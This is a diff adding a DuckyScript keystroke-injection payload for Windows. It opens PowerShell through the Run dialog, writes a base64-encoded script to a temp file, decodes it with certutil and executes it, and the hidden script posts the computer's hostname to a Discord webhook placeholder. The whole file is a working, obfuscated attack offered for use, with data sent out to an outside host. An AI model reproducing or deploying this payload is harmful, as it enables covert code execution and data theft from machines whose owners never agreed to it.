@@ -1,0 +1,19 @@
+REM Title: Computer hostname to Discord Webhook
+REM Description: Retrieves the hostname of the computer and sends it as JSON content in a POST request to a Discord webhook.
+REM AUTHOR: K1kuK0nK4
+REM Target: Windows
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+REM Replace "webhookgoeshere" by webhook URL.
+STRING $webhook = "DISCORD_WEBHOOK_HERE";
+REM Replace the base64 string by the powershell encoded script.
+STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\k.ps1"; echo JGhvc3RuYW1lID0gJGVudjpDT01QVVRFUk5BTUUKJGJvZHkgPSBAewogICAgY29udGVudCA9ICRob3N0bmFtZQp9IHwgQ29udmVydFRvLUpzb24KCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIK > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\k.ps1"
+ENTER
+DELAY 300
+STRING exit
+ENTER
